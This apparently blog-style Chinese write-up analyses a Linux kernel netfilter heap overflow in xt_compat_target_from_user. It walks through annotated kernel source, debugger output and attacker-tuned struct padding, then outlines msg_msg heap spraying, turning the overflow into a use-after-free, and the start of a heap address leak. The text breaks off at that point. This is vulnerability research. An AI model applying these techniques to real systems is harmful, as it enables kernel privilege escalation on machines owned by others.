<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function">    <span class="title">compat_do_replace</span><span class="params">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_sockptr(&amp;tmp, arg, <span class="keyword">sizeof</span>(tmp)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">///....</span></span><br><span class="line">    <span class="comment">//这里的tmp.size即为0xfb6，传入的data.replace.size，也是申请了堆块的。</span></span><br><span class="line">    <span class="comment">//不过这个堆块不用太过关注，但是这个不能随便设置，不然会在如下检查出错误</span></span><br><span class="line">    <span class="comment">//然后跳转out_unlock从而无法进入漏洞点</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //translate_compat_table函数中</span></span><br><span class="line"><span class="comment">    //Walk through entries, checking offsets. </span></span><br><span class="line"><span class="comment">	xt_entry_foreach(iter0, entry0, compatr-&gt;size) &#123;</span></span><br><span class="line"><span class="comment">		ret = check_compat_entry_size_and_hooks(iter0, info, &amp;size,</span></span><br><span class="line"><span class="comment">							entry0,</span></span><br><span class="line"><span class="comment">							entry0 + compatr-&gt;size);</span></span><br><span class="line"><span class="comment">		if (ret != 0)</span></span><br><span class="line"><span class="comment">			goto out_unlock;</span></span><br><span class="line"><span class="comment">		++j;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//需要注意的是这个newinfo和下面函数中的newinfo不是同一个</span></span><br><span class="line">    newinfo = xt_alloc_table_info(tmp.size);</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    ret = translate_compat_table(net, &amp;newinfo, &amp;loc_cpu_entry, &amp;tmp);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>复制的这些数据中就包含定义好的size，用来完成之后的堆块申请。</p>
</li>
</ul>

        <h2 id="4-translate-compat-table"   >
          <a href="#4-translate-compat-table" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-translate-compat-table" class="headerlink" title="4.translate_compat_table()"></a>4.translate_compat_table()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net,struct xt_table_info **pinfo,<span class="keyword">void</span> **pentry0,<span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xffffffff81b0b3e0</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> *<span class="title">compatr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"><span class="keyword">void</span> *pos, *entry1;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_entry</span> *<span class="title">iter0</span>;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p><code>size</code>：<code>size = compatr-&gt;size;</code></p>
</li>
<li><p><code>newinfo</code>：依据<code>size</code>即上述的<code>compatr-&gt;size</code>申请堆块，漏洞点就出在这个申请的堆块上面。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">translate_compat_table(struct net *net,</span><br><span class="line">                       struct xt_table_info **pinfo,</span><br><span class="line">                       <span class="keyword">void</span> **pentry0,</span><br><span class="line">                       <span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    size = compatr-&gt;size;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//这个堆块就是漏洞堆块了。</span></span><br><span class="line">    newinfo = xt_alloc_table_info(size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>通过<code>xt_alloc_table_info</code>来申请堆块，其中有如下代码</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/netfilter/x_tables.c</span></span><br><span class="line"><span class="function">struct xt_table_info *<span class="title">xt_alloc_table_info</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> sz = <span class="keyword">sizeof</span>(*info) + size;<span class="comment">//加上0x40大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sz &lt; <span class="keyword">sizeof</span>(*info) || sz &gt;= XT_MAX_TABLE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//实际申请的堆块大小为0xffe,即kmalloc-4096，这个堆块就是漏洞堆块了。</span></span><br><span class="line">    <span class="comment">//结构为struct xt_table_info</span></span><br><span class="line">	info = kvmalloc(sz, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(*info));</span><br><span class="line">	info-&gt;size = size;</span><br><span class="line">	<span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到使用<code>kvmalloc</code>，申请标志为<code>GFP_KERNEL_ACCOUNT</code>，并且<code>XT_MAX_TABLE_SIZE</code>定义如下，也就是在kmalloc-512到kmalloc-8192</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define XT_MAX_TABLE_SIZE	(512 * 1024 * 1024)</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>pos/entry1</code>：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry1 = newinfo-&gt;entries;</span><br><span class="line">pos = entry1;</span><br></pre></td></tr></table></div></figure>

<p>即<code>pos/entry1</code>的值为<code>newinfo_addr+0x40(0x4*3+0x14+0x14+0x4+0x8)</code></p>
</li>
<li><p>调用如下函数进行下一步：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(iter0, &amp;pos, &amp;size,</span><br><span class="line">					    newinfo, entry1);</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="5-compat-copy-entry-from-user"   >
          <a href="#5-compat-copy-entry-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-compat-copy-entry-from-user" class="headerlink" title="5.compat_copy_entry_from_user()"></a>5.compat_copy_entry_from_user()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">			    <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">			    struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：不太清楚</p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="comment">//即保存pos的栈地址，值为newinfo-&gt;entries(newinfo_addr+0x40)</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>相关操作：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">                            <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">                            struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//即pos加上0x70，值为newinfo_addr+0x40+0x70</span></span><br><span class="line">    *dstptr += <span class="keyword">sizeof</span>(struct ipt_entry);</span><br><span class="line">    *size += <span class="keyword">sizeof</span>(struct ipt_entry) - <span class="keyword">sizeof</span>(struct compat_ipt_entry);</span><br><span class="line">    xt_ematch_foreach(ematch, e)</span><br><span class="line">		xt_compat_match_from_user(ematch, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    xt_compat_target_from_user(t, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="6-xt-compat-match-from-user"   >
          <a href="#6-xt-compat-match-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-match-from-user" class="headerlink" title="6.xt_compat_match_from_user()"></a>6.xt_compat_match_from_user()</h2>
      <p>这个函数和接下来的漏洞函数<code>xt_compat_target_from_user</code>可以说基本一致，观察下图即可看到，具体用来干什么不太清楚，但是作用也是相关的pad填充<code>newinfo</code>上的数据。打了一个循环<code>xt_ematch_foreach</code>，在我们关注的这个漏洞里，其作用就只是使得<code>*dstptr + n * msize</code>，也就是在我们关心的最终值为<code>newinfo_addr+0x40+0x70+n * msize</code>，从而使得在进入<code>xt_compat_target_from_user</code>之前，<code>*dstptr</code>上的堆块地址已经移动到末尾了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png" alt="image-20220507214923917" style="zoom: 80%;" />        <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png" alt="image-20220507214947982" style="zoom: 80%;" /></p>
<p>做了一个数据对比：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">newinfo：				0xffff888006a2a000</span><br><span class="line">t：						0xffff888006a2afda</span><br><span class="line">t-&gt;data：				0xffff888006a2affa</span><br><span class="line">target-&gt;targetsize：		0x4</span><br><span class="line">dstptr：</span><br><span class="line">	xt_compat_match_from_user的时候：</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2a0b0</span><br><span class="line">	xt_compat_target_from_user的时候：</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2afda</span><br></pre></td></tr></table></div></figure>

<p>也就是说经过<code>xt_compat_match_from_user</code>函数之后，保存在<code>*dstptr</code>上的漏洞堆的地址已经加上了<code>0xf2a</code>。</p>

        <h2 id="6-xt-compat-target-from-user"   >
          <a href="#6-xt-compat-target-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-target-from-user" class="headerlink" title="6.xt_compat_target_from_user()"></a>6.xt_compat_target_from_user()</h2>
      <p>终于来到最后的漏洞函数</p>
<ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xFFFFFFFF81A82F75</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> *<span class="title">t</span>;</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br></pre></td></tr></table></div></figure></li>
<li><p>相关操作：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xt_compat_target_from_user</span><span class="params">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line">	<span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//即获取指针为newinfo+0x40+0x70+0xf2a</span></span><br><span class="line">	t = *dstptr;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//进行8字节对齐</span></span><br><span class="line">	pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line">	<span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//target-&gt;targetsize为4，则最终传入的地址为</span></span><br><span class="line">        <span class="comment">//newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe</span></span><br><span class="line">        <span class="comment">//同时pad在经过对齐之后也为4,那么就溢出2个字节</span></span><br><span class="line">		<span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="总结-1"   >
          <a href="#总结-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
      <p>通过上述分析可以看到，其实该漏洞的成因就是</p>

        <h3 id="1-控制堆块大小和偏移"   >
          <a href="#1-控制堆块大小和偏移" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-控制堆块大小和偏移" class="headerlink" title="(1)控制堆块大小和偏移"></a>(1)控制堆块大小和偏移</h3>
      <p>通过控制传入的<code>&amp;data</code>中的<code>pad</code>的大小来控制申请的堆块的大小和<code>t-&gt;data</code>的相对偏移地址</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>         <span class="comment">// 0x60</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>            <span class="comment">// 0x70</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>         <span class="comment">// 0x20</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];     </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>      <span class="comment">// 0x20</span></span><br><span class="line">&#125; data = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></div></figure>

<p>例子：</p>
<p>比如bsauce师傅提供的EXP中的pad如下，这里使用的是<code>kmalloc-4096</code>：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>那么我们尝试使用<code>kmalloc-2048</code>，在代码中减去0x800得到如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> - <span class="number">0x800</span>];</span><br></pre></td></tr></table></div></figure>

<p>断点打在<code>xt_alloc_table_info</code>，在第二次的<code>xt_alloc_table_info</code>申请漏洞堆块处，查看下CPU0的<code>kmalloc-2048</code>中<code>freelist</code>中的堆块。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png" alt="image-20220508200120767"></p>
<p>然后<code>finish</code>当前函数，查看rax申请到的堆块，即为<code>freelist</code>中的第一个堆块</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png" alt="image-20220508200155851"></p>
<p>可以看到是从CP0的<code>kmalloc-2048</code>中申请得到的，之后在<code>call memset</code>的漏洞点打下断点，按c继续运行，断下来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png" alt="image-20220508200407354"></p>
<p>可以看到仍然还是该漏洞堆块，并且相关的地址也类似的，pad为0x4，所以还是存在漏洞点的。</p>
<p>不过具体的细节有点不太清楚，后续还得补一补<code>Netfilter</code>的相关知识。</p>

        <h3 id="2-控制填充pad"   >
          <a href="#2-控制填充pad" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-控制填充pad" class="headerlink" title="(2)控制填充pad"></a>(2)控制填充pad</h3>
      <p>通过控制传入的<code>data.target.u.user.revision</code>来控制<code>target-&gt;targetsize</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.target.u.user.revision = <span class="number">1</span>;</span><br></pre></td></tr></table></div></figure>

<p>不同的<code>version</code>控制不同的<code>target-&gt;targetsize</code>。</p>
<p>这里经过我自己的实际调试，感觉bsauce师傅说的有点小问题。漏洞点应该是出在上述的<code>t-&gt;daii</code>地址没有0x8对齐的时候，并且<code>target-&gt;size</code>也没有0x8对齐的情况下。</p>
<p>此外，不应该只是2字节溢出，最多应该可以到达4字节溢出，如下设置</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> + <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>这样可以溢出4个字节写0，最终效果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png" alt="image-20220508204003227"></p>
<p>如果再加pad的话就会导致申请出<code>kmalloc-8192</code>的堆块了</p>

        <h1 id="二、漏洞利用"   >
          <a href="#二、漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1>
      
        <h2 id="1-溢出转化UAF"   >
          <a href="#1-溢出转化UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-溢出转化UAF" class="headerlink" title="1.溢出转化UAF"></a>1.溢出转化UAF</h2>
      <p>这里涉及到之前提到的<code>msg_msg</code>结构体利用。</p>

        <h3 id="1-堆喷内存布局"   >
          <a href="#1-堆喷内存布局" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆喷内存布局" class="headerlink" title="(1)堆喷内存布局"></a>(1)堆喷内存布局</h3>
      <p>首先使用<code>msgget</code>申请多个消息队列，然后往每个消息队列发送两条消息，一条主消息<code>0x1000</code>，一条辅助消息<code>0x400</code>。这里发送消息时需要注意下，先遍历每个队列发送主消息，然后再遍历每个队列发送辅助消息。这样进行堆喷构造后，其中就会有部分的消息队列中的主消息连成一整块地址连续的内存，<strong>辅助消息也需要地址连成一整块，方便后续泄露地址，但是这里为了好看就没有连一起</strong>。比如这里申请三个消息队列，最终形成类似的如下布局</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png" alt="image-20220513110107919"></p>
<p>当然这里每条<code>0x1000</code>的主消息中还有几个<code>struct msg_msgseg*</code>没有画出来</p>

        <h3 id="2-漏洞溢出构造UAF"   >
          <a href="#2-漏洞溢出构造UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞溢出构造UAF" class="headerlink" title="(2)漏洞溢出构造UAF"></a>(2)漏洞溢出构造UAF</h3>
      <p>这里我们先释放例子中的第二条主消息，虽说在主消息中是由4个<code>kmalloc(0x400)</code>申请出来的4个堆块，但是如果都释放之后，内存的回收机制发现这四个地址连续且都被释放，那么就会归并成一页<code>page</code>还给<code>Slub</code>分配器，其实就是<code>kmalloc-4096</code>。（里面算法很复杂，不是很懂，后面再来理清楚。）之后再申请<code>0x1000</code>大小的堆块，就会优先从这里取。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png" alt="image-20220513110346186"></p>
<p>然后我们使用漏洞，调用<code>socketopt</code>来申请一个<code>0x1000</code>的<code>xt_table_info</code>，就会占据到我们刚刚释放的<code>0x1000</code>大小的堆块上。(这个前面我们分析<code>socketopt</code>会申请两个<code>0x1000</code>大小的堆块，那么我们之后就是多释放几条主消息即可)这样在占据之后，发生2字节溢出写0，就可以溢出到下一个消息队列的<code>msg_msg</code>头部结构的<code>struct list_head m_list.next</code>指针，从而使得其指向其他位置，如果运气好的话，由于辅助消息也是堆喷形式，且大小为<code>0x400</code>，那么溢出两字节写0就可能将该<code>next</code>指针指向其他的辅助消息，从而造成两个消息队列中共存一个辅助消息。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png" alt="image-20220513110927931"></p>
<p>比如图中消息队列3中的主消息头部的<code>struct list_head m_list.next</code>即被修改(黑色为溢出2字节写0)，如红色箭头所示指向了消息队列1中的辅助消息，这样消息队列1和消息队列3都指向了同一个辅助消息，构成了堆块<code>overlap</code>。之后我们释放消息队列1中的辅助消息，而消息队列3仍然指向该辅助消息，构成了UAF。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png"></p>
<p>🔺注：在实际的利用里，需要进行堆喷布局，申请很多的消息队列，这时候就需要用<code>MSG_COPY</code>标志位来进行消息读取。利用此标志位读取消息但不释放堆块，然后借助发送消息时自己留下的索引标志来判断到底是哪个辅助消息被两个消息队列所包含，这样就能进行后续的利用。</p>

        <h2 id="2-利用UAF"   >
          <a href="#2-利用UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用UAF" class="headerlink" title="2.利用UAF"></a>2.利用UAF</h2>
      
        <h3 id="1-泄露堆地址"   >
          <a href="#1-泄露堆地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露堆地址" class="headerlink" title="(1)泄露堆地址"></a>(1)泄露堆地址</h3>
      <p>首先使用<code>sk_buff</code>的<code>data</code>数据块来占据该<code>UAF</code>堆块。前面提到<code>sk_buff</code>的结构头使用独有的缓冲池<code>kache</code>来申请，但是其<code>data</code>数据块还是使用<code>kmalloc</code>常规路线来申请释放(使用正常的发包收包即可完成申请释放)，并且<code>size</code>和<code>data</code>内容完全可控，这样我们就可以完全控制该<code>UAF</code>堆块。</p>
<p>之后伪造一个<code>fake_msg_msg</code>结构体，结构如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png" alt="image-20220513112451162"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//与msg_queue或者其他的msg_msg组成双向循环链表</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//单向链表，指向该条信息后面的msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>改大其<code>m_ts</code>域，就可以读取出消息队列2的辅助消息头部指针<code>struct list_head m_list.next</code>的值，从而泄露消息队列2的<code>msg_msg_queue</code>的<code>struct list_head m_list</code>域的地址，为一个堆地址。</p>
